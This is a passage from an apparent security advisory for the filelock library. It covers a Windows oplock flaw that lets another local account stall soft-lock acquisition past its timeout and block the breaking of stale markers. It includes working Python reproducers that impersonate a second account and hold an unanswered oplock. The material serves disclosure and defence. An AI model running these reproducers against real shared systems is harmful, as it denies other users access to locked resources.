list). `UI:N` (no user interaction). `S:U` (scope unchanged). `C:N` and `I:N`: that account can read the marker's content (process id and host name) anyway, and mutual exclusion holds. `A:L` (partial availability impact): one thread, or the event loop with `run_in_executor=False`, waits until the holder answers; 10 s per attempt in the two-account runs, no crash. Metrics in doubt take the lower reading.\n\nClassification from the review: **security, conditional** on an unheld marker that another account can open.\n\n## Scope and preconditions\n\n- Platform and classes: Windows only. `SoftFileLock`, `MarkerSoftFileLock`, `SoftFileLease`, `AsyncSoftFileLock` and the other async soft locks, and `FileLock` after its `ENOSYS` fallback to a soft lock. `WindowsFileLock` opens its lock file on a separate code path that this advisory does not cover.\n- Marker access: the soft locks create the marker with `os.open`, which on Windows applies no more of `mode` than the read-only attribute (GHSA-8mx5-7m5m-r77g). The marker carries the lock directory's inheritable entries. Another account that those entries grant read access to new files can open the marker with a read handle that shares read, write and delete.\n- Unheld marker: no handle may be open on the marker when the other account requests the oplock. That is a holder that died and left its marker, a holder that closed its descriptor, or a marker whose `lifetime` has passed. While the holder keeps its handle, the request fails.\n- Holder behavior: the other account requests the oplock through an overlapped `DeviceIoControl` and never acknowledges the break. Windows cancels a thread's pending request when the thread exits, so the holder thread stays alive. A same-account process that answers slowly, such as an indexer, has the same effect for its answer time.\n- What the lock user sees: `SoftFileLock.acquire(timeout=1)` returned `Timeout` after 10.02 s with the second account's handle. In the same-account probe `os.open` with `O_RDONLY` was still running after 15 s and returned once the holder closed. The retry loop consults `timeout`, `blocking=False` and `cancel_check` between attempts only. With `AsyncSoftFileLock(run_in_executor=False)` the event loop waits.\n- Stale break: `break_lock_file` renames and unlinks by path. Both calls wait in the same way, so a stale marker under such an oplock stays, and no process acquires the lock until the holder closes.\n- Not affected: mutual exclusion, and the lock reads, writes and deletes no file other than the marker.\n\n## Affected code\n\nScanned commit `b831496b0273`: the [`os.open` in `_read_lock_file`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L323) ([function](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L312-L335)), called from [`_try_break_stale_lock`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L107-L123) on every attempt that finds a marker, and from [`_unprobeable_holder`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L137), [`pid`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L164) and [`is_lock_held_by_us`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L179). [`break_lock_file`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_util.py#L84-L122) renames at L116 and unlinks at L118 and L122, by path. [`_poll_until_acquired`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_api.py#L1378-L1408) and [`_check_give_up`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_api.py#L1590-L1608) test the deadline, `blocking` and `cancel_check` only between attempts.\n\n## Introduced\n\n[e35c3af](https://github.com/tox-dev/filelock/commit/e35c3af) \"feat(soft): detect and break stale locks\" ([#476](https://github.com/tox-dev/filelock/pull/476), 2026-02-13), first tag 3.22.0 (verified with `git tag --contains`). Before it a soft lock created its marker with `O_CREAT | O_EXCL` and never opened an existing one. #476 read the marker on Windows through `CreateFileW` and broke a stale one with `Path.rename` and `Path.unlink`. These wait for an oplock as `os.open` does, because none of them passes `FILE_COMPLETE_IF_OPLOCKED`, an `NtCreateFile` option that returns instead of waiting. The read became the `os.open` in `_read_lock_file` with [bfbfa76](https://github.com/tox-dev/filelock/commit/bfbfa76) ([#548](https://github.com/tox-dev/filelock/pull/548), 3.29.1) and the break moved into `break_lock_file` with [d244c6d](https://github.com/tox-dev/filelock/commit/d244c6d) ([#551](https://github.com/tox-dev/filelock/pull/551), 3.29.2); the by-path calls stayed.\n\n## Mechanism\n\nEach attempt of `_acquire` first calls `os.open(path, O_WRONLY | O_CREAT | O_EXCL)`. On an existing marker that fails with `EEXIST` (or `EACCES` on Windows) at once; the same-account probe shows the failed exclusive create returning at once under an oplock too. `_acquire` then calls `_try_break_stale_lock`, which calls `_read_lock_file`: `os.lstat`, then `os.open(path, O_RDONLY | O_NOFOLLOW | O_NONBLOCK)`. On Windows `O_NOFOLLOW` and `O_NONBLOCK` do not exist (the code reads them with `getattr(os, ..., 0)`), and `os.open` calls `CreateFileW`. When another handle holds a Level 1 or batch oplock on the file, that call sends the holder a break request and returns only when the holder acknowledges it or closes its handle. `_check_give_up` tests the deadline after the attempt returns, so the wait overruns `timeout`, `blocking=False` and `cancel_check` by its length. Once the open returns, the attempt ends and `_check_give_up` raises `Timeout`, because the deadline has passed.\n\nA marker whose holder is gone takes the second path. `break_lock_file` renames it to a break name and unlinks it, by path. On Windows the rename and the delete open the file with delete access, which breaks a Level 1 or batch oplock the same way; the same-account probe shows `os.rename` and `os.unlink` still running after 15 s and returning once the holder closed. The `lifetime` break at L123 runs the same function. A stale marker under such an oplock is therefore not removed, and every attempt by every process waits inside the read. The other account can request the oplock again as soon as the lock user's handle closes, between two attempts or two `acquire()` calls, as in the Linux lease case of GHSA-7hmp-gf99-57hx. Nothing in the retry loop bounds this wait.\n\n## Reproduction\n\nThe review's reproducers, quoted as received. `oplock_vm.py` section `[2]` is this finding; sections `[1a]` and `[1b]` belong to the `release()` advisory. `oplock_semantics_vm.py` is the same-account probe of which path operations wait. They ran on a Windows 11 VM (NTFS, CPython 3.14.8) against the head of PR #835 at `3e4c5ef`, where `_read_lock_file` and `break_lock_file` are the same code as at `b831496b0273` apart from import changes. The second account `fltester` is a member of `Users`; the directory grants it `(OI)(CI)(M)`.\n\n**`oplock_vm.py`**\n\n```python\n\"\"\"\nWindows oplock checks beyond the lock-file open PR #835 changes: release() and the soft locks' marker read.\n\nRun on the VM (PowerShell, from the synced worktree, with the fltester account present):\n  C:\\\\venvs\\\\rev4F\\\\Scripts\\\\python.exe oplock_vm.py fltester '\u003cpassword\u003e' C:\\\\tmp\\\\rev4F-oplock\n\n[1] A second account keeps requesting a Level 1 oplock on the lock file through a read handle that shares delete.\n    WindowsFileLock._release closes its handle and then unlinks by path; an oplock granted in between makes the\n    DeleteFileW inside os.unlink wait for the holder's acknowledgement. [1a] races the close-to-unlink window as is;\n    [1b] widens that window to 200 ms with a patched os.unlink so the grant lands inside it.\n[2] A second account holds a Level 1 oplock on a soft-lock marker whose holder is alive. SoftFileLock.acquire reads the\n    marker through os.open, which waits for the acknowledgement, past timeout=1.\n\nA thread that exits has its pending oplock request cancelled, so every holder thread stays alive until the end.\n\"\"\"\n\nfrom __future__ import annotations\n\nimport ctypes\nimport os\nimport subprocess\nimport sys\nimport threading\nimport time\nfrom ctypes import wintypes\n\nfrom filelock import FileLock, SoftFileLock, Timeout\n\nuser, password, base = sys.argv[1], sys.argv[2], sys.argv[3]\nicacls = os.path.join(os.environ[\"SYSTEMROOT\"], \"System32\", \"icacls.exe\")\nos.makedirs(base, exist_ok=True)\nsubprocess.run([icacls, base, \"/grant\", f\"{user}:(OI)(CI)(M)\"], check=True, capture_output=True)\n\nadvapi32 = ctypes.WinDLL(\"advapi32\", use_last_error=True)\nkernel32 = ctypes.WinDLL(\"kernel32\", use_last_error=True)\nadvapi32.LogonUserW.argtypes = [\n    wintypes.LPCWSTR,\n    wintypes.LPCWSTR,\n    wintypes.LPCWSTR,\n    wintypes.DWORD,\n    wintypes.DWORD,\n    ctypes.POINTER(wintypes.HANDLE),\n]\nkernel32.CreateFileW.restype = kernel32.CreateEventW.restype = wintypes.HANDLE\nkernel32.CreateFileW.argtypes = [\n    wintypes.LPCWSTR,\n    wintypes.DWORD,\n    wintypes.DWORD,\n    ctypes.c_void_p,\n    wintypes.DWORD,\n    wintypes.DWORD,\n    wintypes.HANDLE,\n]\n\n\nclass Overlapped(ctypes.Structure):\n    _fields_ = (\n        (\"Internal\", ctypes.c_void_p),\n        (\"InternalHigh\", ctypes.c_void_p),\n        (\"Offset\", wintypes.DWORD),\n        (\"OffsetHigh\", wintypes.DWORD),\n        (\"hEvent\", wintypes.HANDLE),\n    )\n\n\nkernel32.DeviceIoControl.argtypes = [\n    wintypes.HANDLE,\n    wintypes.DWORD,\n    ctypes.c_void_p,\n    wintypes.DWORD,\n    ctypes.c_void_p,\n    wintypes.DWORD,\n    ctypes.c_void_p,\n    ctypes.POINTER(Overlapped),\n]\nkernel32.CloseHandle.argtypes = [wintypes.HANDLE]\nkernel32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]\n\nGENERIC_READ = 0x80000000\nSHARE_ALL = 0x7\nOPEN_EXISTING = 3\nFLAG_OVERLAPPED = 0x40000000\nINVALID_HANDLE = wintypes.HANDLE(-1).value\nFSCTL_REQUEST_OPLOCK_LEVEL_1 = 0x00090000\nERROR_IO_PENDING = 997\nhold = threading.Event()\nreal_unlink = os.unlink\n\n\ndef impersonate() -\u003e None:\n    token = wintypes.HANDLE()\n    if not advapi32.LogonUserW(user, \".\", password, 3, 0, ctypes.byref(token)):\n        raise ctypes.WinError(ctypes.get_last_error())\n    if not advapi32.ImpersonateLoggedOnUser(token):\n        raise ctypes.WinError(ctypes.get_last_error())\n\n\ndef request_level1(path: str) -\u003e tuple[int, Overlapped] | None:\n    handle = kernel32.CreateFileW(path, GENERIC_READ, SHARE_ALL, None, OPEN_EXISTING, FLAG_OVERLAPPED, None)\n    if handle == INVALID_HANDLE:\n        return None\n    overlapped = Overlapped(hEvent=kernel32.CreateEventW(None, True, False, None))\n    if (\n        not kernel32.DeviceIoControl(handle, FSCTL_REQUEST_OPLOCK_LEVEL_1, None, 0, None, 0, None, ctypes.byref(overlapped))\n        and ctypes.get_last_error() == ERROR_IO_PENDING\n    ):\n        return handle, overlapped\n    kernel32.CloseHandle(handle)\n    kernel32.CloseHandle(overlapped.hEvent)\n    return None\n\n\ndef drop(granted: tuple[int, Overlapped]) -\u003e None:\n    handle, overlapped = granted\n    kernel32.CloseHandle(handle)\n    kernel32.WaitForSingleObject(overlapped.hEvent, 5000)\n    kernel32.CloseHandle(overlapped.hEvent)\n\n\ndef release_under_oplock_requests(label: str, lock_path: str, cycles: int) -\u003e bool:\n    stop = threading.Event()\n    granted_box: list[tuple[int, Overlapped]] = []\n\n    def spinner() -\u003e None:\n        impersonate()\n        while not stop.is_set():\n            if (granted := request_level1(lock_path)) is not None:\n                granted_box.append(granted)\n                hold.wait()\n                return\n\n    releasing = threading.Event()\n    release_durations: list[float] = []\n\n    def owner() -\u003e None:\n        # thread_local locks release only on the acquiring thread, so acquire and release stay on this one\n        for _ in range(cycles):\n            lock = FileLock(lock_path, is_singleton=False)\n            lock.acquire(timeout=5)\n            started = time.monotonic()\n            releasing.set()\n            lock.release()\n            releasing.clear()\n            release_durations.append(time.monotonic() - started)\n            if granted_box:\n                return\n\n    holder = threading.Thread(target=spinner, daemon=True)\n    holder.start()\n    owner_thread = threading.Thread(target=owner, daemon=True)\n    owner_thread.start()\n    owner_thread.join(60)\n    stalled = owner_thread.is_alive() and releasing.is_set()\n    stop.set()\n    longest = max(release_durations, default=0.0) * 1000\n    print(f\"  {label}: oplock granted: {bool(granted_box)}; cycles run: {len(release_durations)}; longest release: {longest:.1f} ms\")\n    if stalled:\n        print(\"  release() still running after 60 s while the oplock holder has not answered the break\")\n        if granted_box:\n            drop(granted_box[0])\n        owner_thread.join(10)\n        print(f\"  release() returned after the holder closed its handle: {not owner_thread.is_alive()}\")\n    return stalled\n\n\nprint(\"[1a] release() against a second account that keeps requesting a Level 1 oplock, natural window\")\nstalled_native = release_under_oplock_requests(\"natural\", os.path.join(base, \"native.lock\"), 500)\n\nprint(\"[1b] the same, with the window between the handle close and the unlink widened to 200 ms\")\n\n\ndef slow_unlink(path: str, *, dir_fd: int | None = None) -\u003e None:\n    time.sleep(0.2)\n    real_unlink(path, dir_fd=dir_fd)\n\n\nos.unlink = slow_unlink\nstalled_scheduled = release_under_oplock_requests(\"scheduled\", os.path.join(base, \"native-scheduled.lock\"), 20)\nos.unlink = real_unlink\n\nprint(\"[2] SoftFileLock.acquire(timeout=1) against a second account's Level 1 oplock on a live marker\")\nmarker = os.path.join(base, \"soft.lock\")\nholder = SoftFileLock(marker, is_singleton=False)\nholder.acquire()\nholder_fd = holder._context.lock_file_fd  # noqa: SLF001\nos.close(holder_fd)  # the marker stays with a live PID, as after a holder that lost only its handle\nimpersonate_done = threading.Event()\ngranted_soft: list[tuple[int, Overlapped]] = []\n\n\ndef take_soft_oplock() -\u003e None:\n    impersonate()\n    if (granted := request_level1(marker)) is not None:\n        granted_soft.append(granted)\n    impersonate_done.set()\n    hold.wait()\n\n\nthreading.Thread(target=take_soft_oplock, daemon=True).start()\nimpersonate_done.wait(5)\nprint(f\"  oplock granted: {bool(granted_soft)}\")\noutcome = [\"still running after 25 s\"]\n\n\ndef contend() -\u003e None:\n    started = time.monotonic()\n    try:\n        SoftFileLock(marker, is_singleton=False).acquire(timeout=1)\n        outcome[0] = f\"acquired after {time.monotonic() - started:.2f} s\"\n    except Timeout:\n        outcome[0] = f\"Timeout after {time.monotonic() - started:.2f} s\"\n    except OSError as error:\n        outcome[0] = f\"{type(error).__name__} after {time.monotonic() - started:.2f} s: {error}\"\n\n\ncontender = threading.Thread(target=contend, daemon=True)\ncontender.start()\ncontender.join(25)\nprint(f\"  contender: {outcome[0]}\")\nsoft_stalled = \"still running\" in outcome[0]\nif granted_soft:\n    drop(granted_soft[0])\n    contender.join(10)\n    print(f\"  after the holder closed: {outcome[0]}\")\nhold.set()\nprint(\"STALLS\" if stalled_native or stalled_scheduled or soft_stalled else \"BOUNDED\")\n```\n\nRecorded output of section `[2]`:\n\n```\n[2] SoftFileLock.acquire(timeout=1) against a second account's Level 1 oplock on a live marker\n  oplock granted: True\n  contender: Timeout after 10.02 s\n  after the holder closed: Timeout after 10.02 s\n```\n\n**`oplock_semantics_vm.py`**\n\n```python\n\"\"\"\nWhich path operations wait for an unanswered oplock break on Windows 11 NTFS. Same account, one process.\n\nRun on the VM: C:\\\\venvs\\\\rev4F\\\\Scripts\\\\python.exe oplock_semantics_vm.py C:\\\\tmp\\\\rev4F-sem\n\"\"\"\n\nfrom __future__ import annotations\n\nimport ctypes\nimport os\nimport sys\nimport threading\nimport time\nfrom ctypes import wintypes\n\nbase = sys.argv[1]\nos.makedirs(base, exist_ok=True)\nkernel32 = ctypes.WinDLL(\"kernel32\", use_last_error=True)\nkernel32.CreateFileW.restype = kernel32.CreateEventW.restype = wintypes.HANDLE\nkernel32.CreateFileW.argtypes = [\n    wintypes.LPCWSTR,\n    wintypes.DWORD,\n    wintypes.DWORD,\n    ctypes.c_void_p,\n    wintypes.DWORD,\n    wintypes.DWORD,\n    wintypes.HANDLE,\n]\n\n\nclass Overlapped(ctypes.Structure):\n    _fields_ = (\n        (\"Internal\", ctypes.c_void_p),\n        (\"InternalHigh\", ctypes.c_void_p),\n        (\"Offset\", wintypes.DWORD),\n        (\"OffsetHigh\", wintypes.DWORD),\n        (\"hEvent\", wintypes.HANDLE),\n    )\n\n\nkernel32.DeviceIoControl.argtypes = [\n    wintypes.HANDLE,\n    wintypes.DWORD,\n    ctypes.c_void_p,\n    wintypes.DWORD,\n    ctypes.c_void_p,\n    wintypes.DWORD,\n    ctypes.c_void_p,\n    ctypes.POINTER(Overlapped),\n]\nkernel32.CloseHandle.argtypes = [wintypes.HANDLE]\nkernel32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]\nGENERIC_READ, GENERIC_WRITE = 0x80000000, 0x40000000\nSHARE_ALL, OPEN_EXISTING, FLAG_OVERLAPPED = 0x7, 3, 0x40000000\nINVALID_HANDLE = wintypes.HANDLE(-1).value\nLEVELS = {\"level1\": 0x00090000, \"batch\": 0x00090008}\n\n\ndef take(path: str, level: str) -\u003e tuple[int, Overlapped]:\n    handle = kernel32.CreateFileW(path, GENERIC_READ, SHARE_ALL, None, OPEN_EXISTING, FLAG_OVERLAPPED, None)\n    overlapped = Overlapped(hEvent=kernel32.CreateEventW(None, True, False, None))\n    pending = not kernel32.DeviceIoControl(handle, LEVELS[level], None, 0, None, 0, None, ctypes.byref(overlapped))\n    assert pending and ctypes.get_last_error() == 997, ctypes.get_last_error()\n    return handle, overlapped\n\n\ndef drop(granted: tuple[int, Overlapped]) -\u003e None:\n    kernel32.CloseHandle(granted[0])\n    kernel32.WaitForSingleObject(granted[1].hEvent, 5000)\n    kernel32.CloseHandle(granted[1].hEvent)\n\n\ndef timed(label: str, operation) -\u003e None:  # noqa: ANN001\n    done = threading.Event()\n    result = [\"still running after 15 s\"]\n\n    def run() -\u003e None:\n        started = time.monotonic()\n        try:\n            operation()\n            result[0] = f\"returned after {(time.monotonic() - started) * 1000:.1f} ms\"\n        except OSError as error:\n            result[0] = f\"{type(error).__name__} after {(time.monotonic() - started) * 1000:.1f} ms: {error}\"\n        done.set()\n\n    threading.Thread(target=run, daemon=True).start()\n    done.wait(15)\n    print(f\"  {label}: {result[0]}\")\n    return done\n\n\ndef open_read(path: str) -\u003e None:\n    os.close(os.open(path, os.O_RDONLY | os.O_BINARY))\n\n\ndef open_write(path: str) -\u003e None:\n    os.close(os.open(path, os.O_RDWR | os.O_BINARY))\n\n\ndef create_new(path: str) -\u003e None:\n    os.close(os.open(path, os.O_WRONLY | os.O_CREAT | os.O_EXCL | os.O_BINARY))\n\n\nfor level in LEVELS:\n    for label, operation, consumes in (\n        (\"os.open O_RDONLY\", open_read, False),\n        (\"os.open O_RDWR\", open_write, False),\n        (\"os.open O_CREAT|O_EXCL on the existing file\", create_new, False),\n        (\"os.utime by path\", lambda p: os.utime(p, None), False),\n        (\"os.rename\", lambda p: os.rename(p, p + \".moved\"), True),\n        (\"os.unlink\", os.unlink, True),\n    ):\n        path = os.path.join(base, f\"{level}-{label.replace(' ', '_').replace('|', '')}.lock\")\n        with open(path, \"w\", encoding=\"utf-8\") as handle:\n            handle.write(\"1\\nhost\\n\")\n        granted = take(path, level)\n        print(f\"{level}, {label}\")\n        done = timed(label, lambda p=path, op=operation: op(p))\n        drop(granted)\n        done.wait(5)\n        print(f\"    after the holder closed: {'done' if done.is_set() else 'still running'}\")\n```\n\nThe review kept this probe's result as a sentence rather than its printed lines: under a same-account Level 1 or batch oplock, `os.open(path, os.O_RDONLY)`, `os.rename` and `os.unlink` were still running after 15 s and returned only once the holder closed its handle; `os.utime` by path and a failed `O_CREAT | O_EXCL` create returned at once.\n\n## Failure sequence\n\n```mermaid\nsequenceDiagram\n    participant A as other local account\n    participant M as soft.lock marker, no handle open\n    participant L as lock user: SoftFileLock(path).acquire(timeout=1)\n    participant W as Windows (NTFS)\n    A-\u003e\u003eW: CreateFileW(soft.lock, GENERIC_READ, share read/write/delete, FILE_FLAG_OVERLAPPED)\n    A-\u003e\u003eW: DeviceIoControl(FSCTL_REQUEST_OPLOCK_LEVEL_1), granted, break never acknowledged\n    L-\u003e\u003eW: os.open(soft.lock, O_CREAT|O_EXCL) fails with EEXIST at once\n    L-\u003e\u003eW: os.lstat(soft.lock) regular file\n    rect rgb(255, 214, 214)\n        L-\u003e\u003eW: os.open(soft.lock, O_RDONLY) inside _read_lock_file\n        Note over L,W: CreateFileW asks A to break the oplock and waits#59; the 1 s deadline, blocking=False and cancel_check are not consulted\n        W--\u003e\u003eL: handle after 10.02 s (two-account run), or when A closes (same-account probe)\n    end\n    L-\u003e\u003eL: _check_give_up: past the deadline, raise Timeout after 10.02 s\n    Note over A,M: a stale marker takes the same wait in Path.rename and Path.unlink, so it is not broken\n```\n\n## Evidence\n\nSection `[2]` of `oplock_vm.py` acquired `soft.lock` as the test account, closed the holder's descriptor so the marker stayed with a live process id and no open handle, took a Level 1 oplock through the second account's read handle (`oplock granted: True`), and ran `SoftFileLock(marker, is_singleton=False).acquire(timeout=1)` on a thread. The call returned `Timeout` after 10.02 s, before the holder closed. The review did not establish what ends the wait at 10 s in the two-account runs; section `[1a]` of the same script, with the second account's handle, shows the same 10 s. In the same-account probe (`oplock_semantics_vm.py`) the open returned only when the holder closed, still running at 15 s. The probe also shows that the failed exclusive create and `os.utime` by path return at once, so the wait is in the read and the break, not in the create attempt.\n\n## Impact\n\nEach `acquire()` of a soft lock that finds a marker another account holds an oplock on runs past its `timeout`, `blocking=False` and `cancel_check` until the holder answers or closes, 10 s per attempt in the recorded two-account runs. A stale marker under that oplock is not broken, so no process acquires the lock while the holder keeps its handle. With `AsyncSoftFileLock(run_in_executor=False)` the wait is on the event loop thread and stops every task in the process; with the default executor one worker thread waits. The documentation names a soft lock as the option for network filesystems, after verification on the mount, and `FileLock` is a soft lock on builds without `fcntl` and after its `ENOSYS` fallback. Mutual exclusion is not affected and nothing other than the marker is read, written or deleted.\n\n## Workarounds\n\n- Keep soft-lock markers in a directory whose ACL grants other accounts no access to new files: a directory inside the user profile, or one with inheritance removed and only the owner, `SYSTEM` and `Administrators` granted (`icacls \u003cdir\u003e /inheritance:r /grant:r \"\u003cowner\u003e:(OI)(CI)F\" \"SYSTEM:(OI)(CI)F\" \"Administrators:(OI)(CI)F\"`). `mode` does not do this on Windows.\n- Run `AsyncSoftFileLock` with the default executor rather than `run_in_executor=False`, so that only a worker thread waits.\n- No `timeout`, `blocking` or `cancel_check` value bounds the wait.\n\n## Patched version\n\n4.2.1.\n\nFix: https://github.com/tox-dev/filelock/pull/835\n\n## Credits\n\nFound by the maintainers while reviewing the fix for the report Anthropic's OSS Scanner sent on 15 October 2026 (review round 4, finding F4).\n\n- 2026-10-15 23:08 UTC: report received (36 findings; this defect is not among them)\n- 2026-10-16 01:16 UTC: fix PR #835 opened, for the Linux lease finding of GHSA-7hmp-gf99-57hx\n- 2026-10-16 08:25 UTC: finding identified in the maintainers' review of PR #835\n- 2026-10-16 22:43 UTC: draft advisory created",
                "text": "On Windows the soft locks (`SoftFileLock`, `MarkerSoftFileLock`, `SoftFileLease`, their async forms, and a `FileLock` that fell back to a soft lock) read their marker by path. The marker is the lock file whose presence says a process holds the lock. Each `acquire()` attempt that finds a marker opens it with `os.open` to read the holder's process id, and the lock renames and deletes a marker it judges stale, by path. On Windows each of these calls waits for an oplock. An oplock (opportunistic lock) is a request by a process that holds a handle on a file to be told before another process opens, renames or deletes that file; the other process waits until the holder answers the break or closes its handle.\n\nAnother local account that can open the marker for reading can take a Level 1 oplock on it while no process holds it open, and leave the break unanswered. Every `acquire()` by the user running the lock (below: the lock user) then waits inside the open, past its `timeout`, `blocking=False` and `cancel_check`, and a stale marker under that oplock is not broken. Mutual exclusion holds and the lock touches no other file. Affected versions are filelock 3.22.0 through 4.2.0 on Windows. The maintainers found this while reviewing the fix for the report Anthropic's OSS Scanner sent on 15 October 2026 (review round 4, finding F4); it is not among the scanner's findings.\n\n## Severity\n\n**CVSS 3.1 `CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L` scores 2.5 (Low).**\n\n`AV:L` (local): the other account needs a logon on the same host. `AC:H` (high attack complexity): Windows grants a Level 1 or batch oplock only to the sole open handle on a file, so the marker must have no holder handle when the other account asks. That account cannot bring this about; it waits for a holder that died, closed its descriptor, or left a marker past its `lifetime`. `PR:L` (low privileges): an ordinary account with read access to the marker through the directory's inherited ACL (access control list). `UI:N` (no user interaction). `S:U` (scope unchanged). `C:N` and `I:N`: that account can read the marker's content (process id and host name) anyway, and mutual exclusion holds. `A:L` (partial availability impact): one thread, or the event loop with `run_in_executor=False`, waits until the holder answers; 10 s per attempt in the two-account runs, no crash. Metrics in doubt take the lower reading.\n\nClassification from the review: **security, conditional** on an unheld marker that another account can open.\n\n## Scope and preconditions\n\n- Platform and classes: Windows only. `SoftFileLock`, `MarkerSoftFileLock`, `SoftFileLease`, `AsyncSoftFileLock` and the other async soft locks, and `FileLock` after its `ENOSYS` fallback to a soft lock. `WindowsFileLock` opens its lock file on a separate code path that this advisory does not cover.\n- Marker access: the soft locks create the marker with `os.open`, which on Windows applies no more of `mode` than the read-only attribute (GHSA-8mx5-7m5m-r77g). The marker carries the lock directory's inheritable entries. Another account that those entries grant read access to new files can open the marker with a read handle that shares read, write and delete.\n- Unheld marker: no handle may be open on the marker when the other account requests the oplock. That is a holder that died and left its marker, a holder that closed its descriptor, or a marker whose `lifetime` has passed. While the holder keeps its handle, the request fails.\n- Holder behavior: the other account requests the oplock through an overlapped `DeviceIoControl` and never acknowledges the break. Windows cancels a thread's pending request when the thread exits, so the holder thread stays alive. A same-account process that answers slowly, such as an indexer, has the same effect for its answer time.\n- What the lock user sees: `SoftFileLock.acquire(timeout=1)` returned `Timeout` after 10.02 s with the second account's handle. In the same-account probe `os.open` with `O_RDONLY` was still running after 15 s and returned once the holder closed. The retry loop consults `timeout`, `blocking=False` and `cancel_check` between attempts only. With `AsyncSoftFileLock(run_in_executor=False)` the event loop waits.\n- Stale break: `break_lock_file` renames and unlinks by path. Both calls wait in the same way, so a stale marker under such an oplock stays, and no process acquires the lock until the holder closes.\n- Not affected: mutual exclusion, and the lock reads, writes and deletes no file other than the marker.\n\n## Affected code\n\nScanned commit `b831496b0273`: the [`os.open` in `_read_lock_file`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L323) ([function](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L312-L335)), called from [`_try_break_stale_lock`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L107-L123) on every attempt that finds a marker, and from [`_unprobeable_holder`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L137), [`pid`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L164) and [`is_lock_held_by_us`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L179). [`break_lock_file`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_util.py#L84-L122) renames at L116 and unlinks at L118 and L122, by path. [`_poll_until_acquired`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_api.py#L1378-L1408) and [`_check_give_up`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_api.py#L1590-L1608) test the deadline, `blocking` and `cancel_check` only between attempts.\n\n## Introduced\n\n[e35c3af](https://github.com/tox-dev/filelock/commit/e35c3af) \"feat(soft): detect and break stale locks\" ([#476](https://github.com/tox-dev/filelock/pull/476), 2026-02-13), first tag 3.22.0 (verified with `git tag --contains`). Before it a soft lock created its marker with `O_CREAT | O_EXCL` and never opened an existing one. #476 read the marker on Windows through `CreateFileW` and broke a stale one with `Path.rename` and `Path.unlink`. These wait for an oplock as `os.open` does, because none of them passes `FILE_COMPLETE_IF_OPLOCKED`, an `NtCreateFile` option that returns instead of waiting. The read became the `os.open` in `_read_lock_file` with [bfbfa76](https://github.com/tox-dev/filelock/commit/bfbfa76) ([#548](https://github.com/tox-dev/filelock/pull/548), 3.29.1) and the break moved into `break_lock_file` with [d244c6d](https://github.com/tox-dev/filelock/commit/d244c6d) ([#551](https://github.com/tox-dev/filelock/pull/551), 3.29.2); the by-path calls stayed.\n\n## Mechanism\n\nEach attempt of `_acquire` first calls `os.open(path, O_WRONLY | O_CREAT | O_EXCL)`. On an existing marker that fails with `EEXIST` (or `EACCES` on Windows) at once; the same-account probe shows the failed exclusive create returning at once under an oplock too. `_acquire` then calls `_try_break_stale_lock`, which calls `_read_lock_file`: `os.lstat`, then `os.open(path, O_RDONLY | O_NOFOLLOW | O_NONBLOCK)`. On Windows `O_NOFOLLOW` and `O_NONBLOCK` do not exist (the code reads them with `getattr(os, ..., 0)`), and `os.open` calls `CreateFileW`. When another handle holds a Level 1 or batch oplock on the file, that call sends the holder a break request and returns only when the holder acknowledges it or closes its handle. `_check_give_up` tests the deadline after the attempt returns, so the wait overruns `timeout`, `blocking=False` and `cancel_check` by its length. Once the open returns, the attempt ends and `_check_give_up` raises `Timeout`, because the deadline has passed.\n\nA marker whose holder is gone takes the second path. `break_lock_file` renames it to a break name and unlinks it, by path. On Windows the rename and the delete open the file with delete access, which breaks a Level 1 or batch oplock the same way; the same-account probe shows `os.rename` and `os.unlink` still running after 15 s and returning once the holder closed. The `lifetime` break at L123 runs the same function. A stale marker under such an oplock is therefore not removed, and every attempt by every process waits inside the read. The other account can request the oplock again as soon as the lock user's handle closes, between two attempts or two `acquire()` calls, as in the Linux lease case of GHSA-7hmp-gf99-57hx. Nothing in the retry loop bounds this wait.\n\n## Reproduction\n\nThe review's reproducers, quoted as received. `oplock_vm.py` section `[2]` is this finding; sections `[1a]` and `[1b]` belong to the `release()` advisory. `oplock_semantics_vm.py` is the same-account probe of which path operations wait. They ran on a Windows 11 VM (NTFS, CPython 3.14.8) against the head of PR #835 at `3e4c5ef`, where `_read_lock_file` and `break_lock_file` are the same code as at `b831496b0273` apart from import changes. The second account `fltester` is a member of `Users`; the directory grants it `(OI)(CI)(M)`.\n\n**`oplock_vm.py`**\n\n```python\n\"\"\"\nWindows oplock checks beyond the lock-file open PR #835 changes: release() and the soft locks' marker read.\n\nRun on the VM (PowerShell, from the 